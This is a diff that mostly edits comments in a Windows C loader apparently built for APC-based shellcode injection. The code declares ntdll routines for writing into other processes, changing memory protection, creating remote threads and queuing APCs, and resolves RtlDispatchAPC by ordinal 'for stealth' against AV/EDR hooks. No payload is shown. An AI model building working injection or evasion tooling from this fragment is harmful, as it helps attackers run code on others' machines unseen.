@@ -233,7 +233,6 @@ typedef NTSTATUS(*pNtAllocateVirtualMemory)(
     ULONG        Protect
     );
 
-// write virtual memory directly into another process
 typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
     HANDLE ProcessHandle,
     PVOID BaseAddress,
@@ -242,7 +241,6 @@ typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
     PSIZE_T NumberOfBytesWritten
     );
 
-// change memory permissions in remote process
 typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
     HANDLE ProcessHandle,
     PVOID* BaseAddress,
@@ -251,7 +249,6 @@ typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
     PULONG OldProtection
     );
 
-// create a thread in another process (or local), more advanced than CreateThread
 typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
     PHANDLE ThreadHandle,
     ACCESS_MASK DesiredAccess,
@@ -266,7 +263,6 @@ typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
     PVOID AttributeList
     );
 
-// queue an apc (asynchronous procedure call) on a thread
 typedef NTSTATUS(NTAPI* pNtQueueApcThread)(
     HANDLE ThreadHandle,
     PPS_APC_ROUTINE ApcRoutine,
@@ -275,7 +271,6 @@ typedef NTSTATUS(NTAPI* pNtQueueApcThread)(
     PVOID ApcArgument3
     );
 
-// resume a suspended thread and trigger apcs if any
 typedef NTSTATUS(NTAPI* pNtAlertResumeThread)(
     HANDLE ThreadHandle,
     PULONG PreviousSuspendCount
@@ -363,28 +358,27 @@ static BOOL ResolveNtdllApis(void)
     //-------[ RtlDispatchAPC ]-------------------
 
         // attempt to resolve the internal function RtlDispatchAPC from ntdll.dll
-        // This function is not officially documented, but is critical
-        // for dispatching a queued APC in user-mode.
+        // This function is not officially documented, but is important
+        // for dispatching a queued APC in user-mode
         // Windows internally uses this to actually run APC routines once they've
         // been queued to a thread, it's the mechanism that invokes the shellcode
-        // or payload when using APC-based injection.
+        // or payload when using APC-based injection
     if (!_RtlDispatchAPC)
     {
         // first, try to resolve it by name, this works if the export table
         // has not been stripped or obfuscated by the system or AV/EDR hooks
         _RtlDispatchAPC = (PPS_APC_ROUTINE)GetProcAddress(hNtdll, "RtlDispatchAPC");
 
-        // If the named export is unavailable (e.g., on some builds or hardened systems),
-        // fall back to resolving it by ordinal #8. This ordinal corresponds
-        // to RtlDispatchAPC in many versions of ntdll.dll
+        // If the named export is unavailable,
+        // fall back to resolving it by ordinal #8
+        // this ordinal corresponds to RtlDispatchAPC 
 
-        // Note: Using ordinals is more fragile, but useful whwere stealth
-        // and fallback strategies are needed to avoid detection.
+        // Note: Using ordinals is more fragile, but useful for stealth
         if (!_RtlDispatchAPC)
             _RtlDispatchAPC = (PPS_APC_ROUTINE)GetProcAddress(hNtdll, (LPCSTR)8);
     }
 
-    // Resolve 'RtlExitUserThread', another internal ntdll function
+    // Resolve RtlExitUserThread, another internal ntdll function
     // Purpose: This cleanly terminates the current thread, similar to ExitThread(),
     // but is a lower-level, more direct method often used,
     // when trying to avoid the higher-level Windows API
@@ -395,7 +389,7 @@ static BOOL ResolveNtdllApis(void)
         _RtlExitUserThread = GetProcAddress(hNtdll, "RtlExitUserThread");
 
     // Final validation step:
-    // Return true only if all required function pointers have been successfully
+    // return true only if all required function pointers have been successfully
     // resolved from ntdll.dll
     // Failing to resolve any of them means the loader is missing a critical
     // building block, and execution should not continue
